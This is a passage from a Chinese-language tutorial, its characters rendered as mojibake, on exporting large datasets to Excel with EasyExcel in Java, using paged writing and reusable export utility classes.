<table><thead><tr><th>æ•°æ®è§„æ¨¡</th><th>æ¨èæ–¹æ¡ˆ</th><th>æ ¸å¿ƒæœºåˆ¶</th><th>å†…å­˜å‹åŠ›</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>&lt; 1ä¸‡è¡Œ</strong></td><td>æ™®é€šæ¨¡å¼</td><td>å…¨é‡åŠ è½½ï¼Œä¸€æ¬¡æ€§å†™å…¥</td><td>âš ï¸ ä¸­ç­‰</td><td>å°æŠ¥è¡¨ã€æŸ¥è¯¢ç»“æœå¯¼å‡º</td></tr><tr><td><strong>1ä¸‡~50ä¸‡è¡Œ</strong></td><td><strong>åˆ†é¡µå†™å…¥æ¨¡å¼</strong></td><td>åˆ†é¡µæŸ¥è¯¢ + åˆ†æ‰¹å†™å…¥</td><td>âœ… ç¨³å®š</td><td>ä¸šåŠ¡æŠ¥è¡¨ã€æ•°æ®å¤‡ä»½</td></tr><tr><td><strong>&gt; 50ä¸‡è¡Œ</strong></td><td><strong>åˆ†é¡µ+å¼‚æ­¥</strong></td><td>å¼‚æ­¥ä»»åŠ¡ + åˆ†é¡µå†™å…¥ + è¿›åº¦æŸ¥è¯¢</td><td>âœ…âœ… æä½</td><td>è¶…å¤§æ•°æ®å¯¼å‡ºã€å®šæ—¶ä»»åŠ¡</td></tr></tbody></table>
<blockquote>
<p>â€œ</p>
<p>é‡ç‚¹æ”»åšç›®æ ‡ï¼š1ä¸‡~50ä¸‡è¡Œçš„åˆ†é¡µå†™å…¥æ¨¡å¼ï¼</p>
</blockquote>
<h3 data-id="heading-2"><strong>äºŒã€åŸºç¡€ï¼šå°æ•°æ®é‡çš„æ™®é€šå¯¼å‡º (å¿«é€Ÿå›é¡¾)</strong></h3>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> Â æ•°æ®é‡å° (&lt;1ä¸‡è¡Œ)ï¼Œæ±‚å¿«æ±‚ç®€å•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/export/simple")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exportSimple</span><span class="hljs-params">(HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
Â  Â  <span class="hljs-comment">// 1ï¸âƒ£ã€é£é™©ç‚¹ã€‘å…¨é‡æŸ¥è¯¢ï¼æ•°æ®é‡å¤§å¿…OOMï¼</span>
Â  Â  List&lt;User&gt; allUsers = userService.findAllUsers();Â 

Â  Â  <span class="hljs-comment">// 2ï¸âƒ£ è®¾ç½®å“åº”å¤´ (å›ºå®šå¥—è·¯)</span>
Â  Â  response.setContentType(<span class="hljs-string">"application/vnd.ms-excel"</span>);
Â  Â  response.setCharacterEncoding(<span class="hljs-string">"utf-8"</span>);
Â  Â  <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> URLEncoder.encode(<span class="hljs-string">"ç”¨æˆ·åˆ—è¡¨"</span>,Â <span class="hljs-string">"UTF-8"</span>);
Â  Â  response.setHeader(<span class="hljs-string">"Content-disposition"</span>,Â <span class="hljs-string">"attachment;filename="</span>Â + fileName +Â <span class="hljs-string">".xlsx"</span>);

Â  Â  <span class="hljs-comment">// 3ï¸âƒ£ EasyExcel ä¸€é”®å†™å…¥</span>
Â  Â  EasyExcel.write(response.getOutputStream(), User.class)
Â  Â  Â  Â  Â  Â  .sheet(<span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯"</span>)
Â  Â  Â  Â  Â  Â  .doWrite(allUsers); <span class="hljs-comment">// å…¨é‡æ•°æ®ä¸€æ¬¡æ€§å†™å…¥</span>
}
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong> Â ä»£ç ç®€å•ï¼Œ5åˆ†é’Ÿæå®šã€‚</p>
<p><strong>è‡´å‘½ç¼ºç‚¹ï¼š</strong> <code>userService.findAllUsers()</code>Â å°±æ˜¯é¢—å®šæ—¶ç‚¸å¼¹ğŸ’£ï¼Œæ•°æ®é‡ç¨å¤§ç›´æ¥ OOMï¼1ä¸‡è¡Œä»¥ä¸Šè¯·æœæ–­æ”¾å¼ƒæ­¤æ–¹æ¡ˆï¼</p>
<h3 data-id="heading-3"><strong>ä¸‰ã€æ ¸å¿ƒï¼šåˆ†é¡µå†™å…¥æ¨¡å¼ (å¾æœ10ä¸‡+æ•°æ®)</strong></h3>
<p>è¿™æ‰æ˜¯å¤„ç†æµ·é‡æ•°æ®çš„æ­£ç¡®å§¿åŠ¿ï¼ ğŸ‘‡</p>
<h5 data-id="heading-4"><strong>3.1 åˆ†é¡µå†™å…¥æ ¸å¿ƒå·¥å…·ç±» (PageWriteExcelHelper)</strong></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.excel.EasyExcel;
<span class="hljs-keyword">import</span> com.alibaba.excel.ExcelWriter;
<span class="hljs-keyword">import</span> com.alibaba.excel.write.metadata.WriteSheet;
<span class="hljs-keyword">import</span> java.io.OutputStream;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
Â * ã€æ ¸å¿ƒæ­¦å™¨ã€‘åˆ†é¡µå†™å…¥Excelå·¥å…· - ä¸“æ²»å„ç§ä¸æœ(OOM)
Â */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageWriteExcelHelper</span>&lt;T&gt; {

Â  Â  <span class="hljs-comment">// ğŸ¯ å…³é”®æ¥å£ï¼šå®šä¹‰å¦‚ä½•åˆ†é¡µè·å–æ•°æ® (ç”±è°ƒç”¨æ–¹å®ç°)</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PageQuerySupplier</span>&lt;T&gt; {
Â  Â  Â  Â  List&lt;T&gt; <span class="hljs-title function_">getPage</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span>; <span class="hljs-comment">// ç¬¬å‡ é¡µ? æ¯é¡µå‡ æ¡?</span>
Â  Â  }

Â  Â  <span class="hljs-comment">/**
Â  Â  Â * æ‰§è¡Œåˆ†é¡µå†™å…¥
Â  Â  Â * <span class="hljs-doctag">@param</span> outputStream Â è¾“å‡ºæµ (å“åº”OutputStream)
Â  Â  Â * <span class="hljs-doctag">@param</span> head Â  Â  Â  Â  Â æ•°æ®æ¨¡å‹Class (å¦‚ User.class)
Â  Â  Â * <span class="hljs-doctag">@param</span> pageSize Â  Â  Â ã€é‡è¦ã€‘æ¯æ‰¹æ¬¡å¤„ç†æ¡æ•° (å»ºè®® 1000~5000)
Â  Â  Â * <span class="hljs-doctag">@param</span> totalCount Â  Â æ€»æ•°æ®é‡ (ç”¨äºè®¡ç®—æ€»é¡µæ•°)
Â  Â  Â * <span class="hljs-doctag">@param</span> supplier Â  Â  Â åˆ†é¡µæ•°æ®æä¾›å™¨ (ä½ çš„ä¸šåŠ¡æŸ¥è¯¢é€»è¾‘)
Â  Â  Â */</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeByPage</span><span class="hljs-params">(OutputStream outputStream,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Class&lt;T&gt; head,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-type">int</span> pageSize,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-type">int</span> totalCount,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  PageQuerySupplier&lt;T&gt; supplier)</span> {
Â  Â  Â  Â  <span class="hljs-comment">// ğŸ”§ 1. åˆå§‹åŒ– ExcelWriter (EasyExcel æ ¸å¿ƒå†™å…¥å™¨)</span>
Â  Â  Â  Â  <span class="hljs-type">ExcelWriter</span> <span class="hljs-variable">excelWriter</span> <span class="hljs-operator">=</span> EasyExcel.write(outputStream, head).build();
Â  Â  Â  Â  <span class="hljs-type">WriteSheet</span> <span class="hljs-variable">writeSheet</span> <span class="hljs-operator">=</span> EasyExcel.writerSheet(<span class="hljs-string">"Sheet1"</span>).build(); <span class="hljs-comment">// é»˜è®¤Sheet</span>

Â  Â  Â  Â  <span class="hljs-keyword">try</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸ“ 2. è®¡ç®—æ€»é¡µæ•° (å°å¿ƒé™¤0)</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-type">int</span> <span class="hljs-variable">totalPage</span> <span class="hljs-operator">=</span> totalCount &gt; <span class="hljs-number">0</span> ? (<span class="hljs-type">int</span>) Math.ceil((<span class="hljs-type">double</span>) totalCount / pageSize) : <span class="hljs-number">1</span>;

Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸ” 3. åˆ†é¡µå¾ªç¯ï¼šæŸ¥è¯¢ -&gt; å†™å…¥ -&gt; é‡Šæ”¾</span>
Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">for</span>Â (<span class="hljs-type">int</span> <span class="hljs-variable">pageNum</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; pageNum &lt;= totalPage; pageNum++) {
Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸšš 3.1 è·å–å½“å‰é¡µæ•°æ® (ä½ çš„åˆ†é¡µæŸ¥è¯¢)</span>
Â  Â  Â  Â  Â  Â  Â  Â  List&lt;T&gt; pageData = supplier.getPage(pageNum, pageSize);

Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// âœï¸ 3.2 å†™å…¥å½“å‰é¡µåˆ° Excel</span>
Â  Â  Â  Â  Â  Â  Â  Â  excelWriter.write(pageData, writeSheet);

Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸ—‘ï¸ 3.3 ã€å…³é”®ã€‘ç«‹å³æ¸…ç©ºé‡Šæ”¾å½“å‰é¡µå†…å­˜ï¼</span>
Â  Â  Â  Â  Â  Â  Â  Â  pageData.clear();
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  } <span class="hljs-keyword">finally</span> {
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸ”’ 4. ã€åŠ¡å¿…å…³é—­ã€‘é‡Šæ”¾èµ„æº (é˜²æ­¢å†…å­˜æ³„æ¼)</span>
Â  Â  Â  Â  Â  Â Â <span class="hljs-keyword">if</span>Â (excelWriter != <span class="hljs-literal">null</span>) {
Â  Â  Â  Â  Â  Â  Â  Â  excelWriter.finish(); <span class="hljs-comment">// é‡è¦ï¼ï¼ï¼</span>
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  }
}
</code></pre>
<h5 data-id="heading-5"><strong>3.2 å¦‚ä½•ä½¿ç”¨è¿™ä¸ªâ€œæ•‘å‘½â€å·¥å…·ç±»ï¼Ÿ</strong></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/export/million")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exportMassiveData</span><span class="hljs-params">(HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
Â  Â  <span class="hljs-comment">// 1ï¸âƒ£ è·å–æ€»æ•°æ®é‡ (ç”¨äºè®¡ç®—åˆ†é¡µ)</span>
Â  Â  <span class="hljs-type">int</span> <span class="hljs-variable">totalUsers</span> <span class="hljs-operator">=</span> userService.countTotalUsers();

Â  Â  <span class="hljs-comment">// 2ï¸âƒ£ è®¾ç½®å“åº”å¤´ (å›ºå®šå¥—è·¯)</span>
Â  Â  response.setContentType(<span class="hljs-string">"application/vnd.ms-excel"</span>);
Â  Â  response.setCharacterEncoding(<span class="hljs-string">"utf-8"</span>);
Â  Â  <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> URLEncoder.encode(<span class="hljs-string">"ç™¾ä¸‡ç”¨æˆ·æ•°æ®"</span>,Â <span class="hljs-string">"UTF-8"</span>);
Â  Â  response.setHeader(<span class="hljs-string">"Content-disposition"</span>,Â <span class="hljs-string">"attachment;filename="</span>Â + fileName +Â <span class="hljs-string">".xlsx"</span>);

Â  Â  <span class="hljs-comment">// 3ï¸âƒ£ ã€æ ¸å¿ƒè°ƒç”¨ã€‘ä½¿ç”¨åˆ†é¡µå·¥å…·ç±»å¯¼å‡º</span>
Â  Â  PageWriteExcelHelper.writeByPage(
Â  Â  Â  Â  Â  Â  response.getOutputStream(), <span class="hljs-comment">// å“åº”è¾“å‡ºæµ</span>
Â  Â  Â  Â  Â  Â  User.class, Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// å¯¼å‡ºæ•°æ®æ¨¡å‹</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-number">2000</span>, Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-comment">// æ¯é¡µ2000æ¡ (æ ¹æ®ä¸šåŠ¡è°ƒæ•´)</span>
Â  Â  Â  Â  Â  Â  totalUsers, Â  Â  Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// æ€»æ•°æ®é‡</span>
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸš€ Lambda å®ç°åˆ†é¡µæŸ¥è¯¢é€»è¾‘ (ä¼˜é›…!)</span>
Â  Â  Â  Â  Â  Â  (pageNum, pageSize) -&gt; userService.findByPage(pageNum, pageSize)
Â  Â  );
}
</code></pre>
<p><strong>å·¥å…·ç±»æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li><strong>å†…å­˜å‹å¥½ï¼š</strong> Â æ¯æ‰¹å¤„ç†å®Œç«‹åˆ»é‡Šæ”¾ï¼Œå†…å­˜æ›²çº¿å¹³ç¨³</li>
<li><strong>é€šç”¨æ€§å¼ºï¼š</strong> Â ä»»ä½•åˆ†é¡µæŸ¥è¯¢ï¼Œä¸€ä¸ªLambdaæå®š</li>
<li><strong>èµ„æºå®‰å…¨ï¼š</strong> Â finally å—ç¡®ä¿Â <code>ExcelWriter</code>Â å…³é—­</li>
<li><strong>ç®€å•æ˜“ç”¨ï¼š</strong> Â å¤æ‚é€»è¾‘å°è£…ï¼Œä¸šåŠ¡ä»£ç åªéœ€å…³æ³¨åˆ†é¡µæŸ¥è¯¢</li>
</ul>
<h3 data-id="heading-6"><strong>å››ã€å‡çº§ï¼šå¢å¼ºç‰ˆå¯¼å‡ºå·¥å…·ç±» (å¼€ç®±å³ç”¨ï¼)</strong></h3>
<p>åŸºäºæ ¸å¿ƒå·¥å…·ç±»ï¼Œæˆ‘ä»¬å°è£…ä¸€ä¸ªæ›´å¼ºå¤§ã€æ›´æ˜“ç”¨çš„Â <code>ExcelExporter</code>ï¼Œæ”¯æŒæ–‡ä»¶åè®¾ç½®ã€å¼‚å¸¸å¤„ç†ç­‰ã€‚</p>
<h5 data-id="heading-7"><strong>ExcelExporter.java (ç»ˆæå·¥å…·ç±»)</strong></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.excel.EasyExcel;
<span class="hljs-keyword">import</span> com.alibaba.excel.ExcelWriter;
<span class="hljs-keyword">import</span> com.alibaba.excel.write.metadata.WriteSheet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.OutputStream;
<span class="hljs-keyword">import</span> java.net.URLEncoder;

<span class="hljs-comment">/**
Â * ã€å¼€ç®±å³ç”¨ã€‘EasyExcel å¯¼å‡ºå¢å¼ºå·¥å…·ç±» (æ”¯æŒæ™®é€š/åˆ†é¡µæ¨¡å¼)
Â */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExcelExporter</span> {

Â  Â  <span class="hljs-comment">// ============== ã€1. åˆ†é¡µå†™å…¥ (å¤§æ•°æ®é‡é¦–é€‰)ã€‘ ==============</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">exportByPage</span><span class="hljs-params">(HttpServletResponse response,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â String fileName, Â  Â // ä¸‹è½½æ–‡ä»¶å
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â String sheetName, Â  // Sheetåç§°
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Class&lt;T&gt; dataModel, // æ•°æ®ç±» (User.class)</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-type">int</span> pageSize, Â  Â  Â  <span class="hljs-comment">// æ¯é¡µæ¡æ•°</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-type">int</span> totalCount, Â  Â  <span class="hljs-comment">// æ€»æ¡æ•°</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â PageQuerySupplier&lt;T&gt; pageSupplier) { <span class="hljs-comment">// åˆ†é¡µæŸ¥è¯¢é€»è¾‘</span>

Â  Â  Â  Â  setupResponse(response, fileName); <span class="hljs-comment">// è®¾ç½®å“åº”å¤´</span>

Â  Â  Â  Â  <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream()) {
Â  Â  Â  Â  Â  Â  <span class="hljs-comment">// ğŸ¯ å§”æ‰˜ç»™æ ¸å¿ƒåˆ†é¡µå·¥å…·æ‰§è¡Œ</span>
Â  Â  Â  Â  Â  Â  PageWriteExcelHelper.writeByPage(out, dataModel, pageSize, totalCount, pageSupplier);
Â  Â  Â  Â  } <span class="hljs-keyword">catch</span> (Exception e) {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å¯¼å‡ºå¤±è´¥: "</span>Â + e.getMessage(), e); <span class="hljs-comment">// ç»Ÿä¸€å¼‚å¸¸å¤„ç†</span>
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-comment">// ============== ã€2. æ™®é€šå¯¼å‡º (å°æ•°æ®é‡)ã€‘ ==============</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">exportSimple</span><span class="hljs-params">(HttpServletResponse response,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â String fileName,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â String sheetName,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Class&lt;T&gt; dataModel,
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â List&lt;T&gt; dataList)</span> { <span class="hljs-comment">// å…¨é‡æ•°æ®List</span>

Â  Â  Â  Â  setupResponse(response, fileName);

Â  Â  Â  Â  <span class="hljs-keyword">try</span> (<span class="hljs-type">OutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getOutputStream()) {
Â  Â  Â  Â  Â  Â  EasyExcel.write(out, dataModel)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .sheet(sheetName)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .doWrite(dataList); <span class="hljs-comment">// å…¨é‡å†™å…¥</span>
Â  Â  Â  Â  } <span class="hljs-keyword">catch</span> (Exception e) {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"å¯¼å‡ºå¤±è´¥: "</span>Â + e.getMessage(), e);
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-comment">// ============== ã€ç§æœ‰æ–¹æ³•ï¼šå“åº”å¤´è®¾ç½® (å¤ç”¨)ã€‘ ==============</span>
Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupResponse</span><span class="hljs-params">(HttpServletResponse response, String fileName)</span> {
Â  Â  Â  Â  <span class="hljs-keyword">try</span> {
Â  Â  Â  Â  Â  Â  response.setContentType(<span class="hljs-string">"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"</span>);
Â  Â  Â  Â  Â  Â  response.setCharacterEncoding(<span class="hljs-string">"UTF-8"</span>);
Â  Â  Â  Â  Â  Â  <span class="hljs-type">String</span> <span class="hljs-variable">encodedFileName</span> <span class="hljs-operator">=</span> URLEncoder.encode(fileName,Â <span class="hljs-string">"UTF-8"</span>).replaceAll(<span class="hljs-string">"\+"</span>,Â <span class="hljs-string">"%20"</span>); <span class="hljs-comment">// å¤„ç†ç©ºæ ¼</span>
Â  Â  Â  Â  Â  Â  response.setHeader(<span class="hljs-string">"Content-disposition"</span>,Â <span class="hljs-string">"attachment;filename*=utf-8''"</span>Â + encodedFileName +Â <span class="hljs-string">".xlsx"</span>);
Â  Â  Â  Â  } <span class="hljs-keyword">catch</span> (Exception e) {
Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"è®¾ç½®å“åº”å¤´å¤±è´¥"</span>, e);
Â  Â  Â  Â  }
Â  Â  }

Â  Â  <span class="hljs-comment">// ============== ã€å†…éƒ¨æ¥å£ï¼šåˆ†é¡µæŸ¥è¯¢ä¾›åº”å•†ã€‘ ==============</span>
Â  Â  <span class="hljs-meta">@FunctionalInterface</span>
Â  Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">PageQuerySupplier</span>&lt;T&gt; {
Â  Â  Â  Â  List&lt;T&gt; <span class="hljs-title function_">getPage</span><span class="hljs-params">(<span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> pageSize)</span>; <span class="hljs-comment">// å‡½æ•°å¼æ¥å£</span>
Â  Â  }
}
</code></pre>
<h5 data-id="heading-8"><strong>ä½¿ç”¨ç¤ºä¾‹ (ä¼˜é›…å¾—åƒé¦–è¯—~)</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åœºæ™¯1: å¯¼å‡ºå°æ•°æ®é‡ (&lt;1ä¸‡)</span>
<span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/export/users/small"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">exportSmallUserList</span>(<span class="hljs-params">HttpServletResponse response</span>) {
Â  Â  <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">User</span>&gt; smallList = userService.<span class="hljs-title function_">findRecentUsers</span>(<span class="hljs-number">5000</span>); <span class="hljs-comment">// æŸ¥5000æ¡</span>
Â  Â  <span class="hljs-title class_">ExcelExporter</span>.<span class="hljs-title function_">exportSimple</span>(
Â  Â  Â  Â  Â  Â  response,
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"æœ€è¿‘ç”¨æˆ·"</span>,
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"ç”¨æˆ·æ•°æ®"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-title class_">User</span>.<span class="hljs-property">class</span>,
Â  Â  Â  Â  Â  Â  smallList
Â  Â  );
}

<span class="hljs-comment">// åœºæ™¯2: å¯¼å‡ºå¤§æ•°æ®é‡ (10ä¸‡+)</span>
<span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/export/users/large"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">exportLargeUserList</span>(<span class="hljs-params">HttpServletResponse response</span>) {
Â  Â  int total = userService.<span class="hljs-title function_">countTotalUsers</span>();
Â  Â  <span class="hljs-title class_">ExcelExporter</span>.<span class="hljs-title function_">exportByPage</span>(
Â  Â  Â  Â  Â  Â  response,
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"å…¨é‡ç”¨æˆ·æ•°æ®"</span>,
Â  Â  Â  Â  Â  Â Â <span class="hljs-string">"ç”¨æˆ·æ¸…å•"</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-title class_">User</span>.<span class="hljs-property">class</span>,
Â  Â  Â  Â  Â  Â  <span class="hljs-number">3000</span>, <span class="hljs-comment">// æ¯æ‰¹3000æ¡</span>
Â  Â  Â  Â  Â  Â  total,
Â  Â  Â  Â  Â  Â  (pageNum, pageSize) -&gt; userService.<span class="hljs-title function_">findByPage</span>(pageNum, pageSize) <span class="hljs-comment">// ä½ çš„åˆ†é¡µæŸ¥è¯¢</span>
Â  Â  );
}
</code></pre>
<p><strong>å¢å¼ºå·¥å…·ç±»äº®ç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç»Ÿä¸€å…¥å£ï¼š</strong> <code>exportSimple</code>Â å’ŒÂ <code>exportByPage</code>Â æ¸…æ™°åŒºåˆ†åœºæ™¯</li>
<li><strong>å“åº”å¤´ä¼˜åŒ–ï¼š</strong> Â å¤„ç†æ–‡ä»¶åç¼–ç ï¼Œå…¼å®¹æ›´å¤šæµè§ˆå™¨</li>
<li><strong>èµ„æºå®‰å…¨ï¼š</strong> Â ä½¿ç”¨Â <code>try-with-resources</code>Â ç¡®ä¿æµå…³é—­</li>
<li><strong>å¼‚å¸¸ç»Ÿä¸€ï¼š</strong> Â æ•è·å¼‚å¸¸å¹¶è½¬æ¢ä¸ºÂ <code>RuntimeException</code></li>
<li><strong>å¼€ç®±å³ç”¨ï¼š</strong> Â å¤åˆ¶åˆ°é¡¹ç›®ï¼Œé…ç½®æ•°æ®æ¨¡å‹å’ŒæŸ¥è¯¢ï¼Œç«‹åˆ»èµ·é£ï¼</li>
</ul>
<h3 data-id="heading-9"><strong>äº”ã€æ€§èƒ½ä¼˜åŒ–å®æˆ˜æŠ€å·§ (ç™¾ä¸‡çº§ä¹Ÿä¸æ€•)</strong></h3>
<h5 data-id="heading-10"><strong>æŠ€å·§ 1ï¼šåŠ¨æ€åˆ†é¡µå¤§å° - æ¦¨å¹²æ€§èƒ½ï¼</strong></h5>
<p>å›ºå®šåˆ†é¡µå¤§å°ä¸å¤Ÿæ™ºèƒ½ï¼Ÿè¯•è¯•åŠ¨æ€è®¡ç®—ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">calculateOptimalPageSize</span><span class="hljs-params">(Class&lt;?&gt; clazz)</span> </span>{
Â  Â  <span class="hljs-comment">// 1. ä¼°ç®—å•æ¡æ•°æ®å¤§å° (å­—èŠ‚) - æ ¹æ®ä¸šåŠ¡æ¨¡å‹è°ƒæ•´é€»è¾‘</span>
Â  Â  <span class="hljs-type">long</span> approxBytesPerRow = <span class="hljs-number">500</span>; <span class="hljs-comment">// ä¿å®ˆä¼°è®¡500å­—èŠ‚/è¡Œ</span>

Â  Â  <span class="hljs-comment">// 2. è·å–å½“å‰JVMå¯ç”¨å†…å­˜ (è½¬æˆå­—èŠ‚)</span>
Â  Â  <span class="hljs-type">long</span> freeMemoryBytes = Runtime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">freeMemory</span>();

Â  Â  <span class="hljs-comment">// 3. ã€å®‰å…¨ç­–ç•¥ã€‘ä»…ä½¿ç”¨ä¸€éƒ¨åˆ†å¯ç”¨å†…å­˜ (ä¾‹å¦‚ 40%)</span>
Â  Â  <span class="hljs-type">long</span> safeMemoryToUse = (<span class="hljs-type">long</span>) (freeMemoryBytes * <span class="hljs-number">0.4</span>);

Â  Â  <span class="hljs-comment">// 4. è®¡ç®—å»ºè®®åˆ†é¡µæ¡æ•°</span>
Â  Â  <span class="hljs-type">int</span> suggestedPageSize = (<span class="hljs-type">int</span>) (safeMemoryToUse / approxBytesPerRow);

Â  Â  <span class="hljs-comment">// 5. è®¾ç½®åˆç†èŒƒå›´ (é˜²æ­¢å¤ªå¤§æˆ–å¤ªå°)</span>
Â  Â Â <span class="hljs-keyword">return</span>Â Math.<span class="hljs-built_in">max</span>(<span class="hljs-number">1000</span>, Math.<span class="hljs-built_in">min</span>(suggestedPageSize, <span class="hljs-number">10000</span>)); <span class="hljs-comment">// é™åˆ¶åœ¨1000~10000æ¡/é¡µ</span>
}

<span class="hljs-comment">// ä½¿ç”¨åŠ¨æ€åˆ†é¡µ</span>
<span class="hljs-type">int</span> dynamicPageSize = <span class="hljs-built_in">calculateOptimalPageSize</span>(User.<span class="hljs-keyword">class</span>);
ExcelExporter.<span class="hljs-built_in">exportByPage</span>(..., dynamicPageSize, ...);
</code></pre>
<h5 data-id="heading-11"><strong>æŠ€å·§ 2ï¼šå¼‚æ­¥å¯¼å‡º + è¿›åº¦æŸ¥è¯¢ - ç”¨æˆ·ä½“éªŒæ‹‰æ»¡ï¼</strong></h5>
<blockquote>
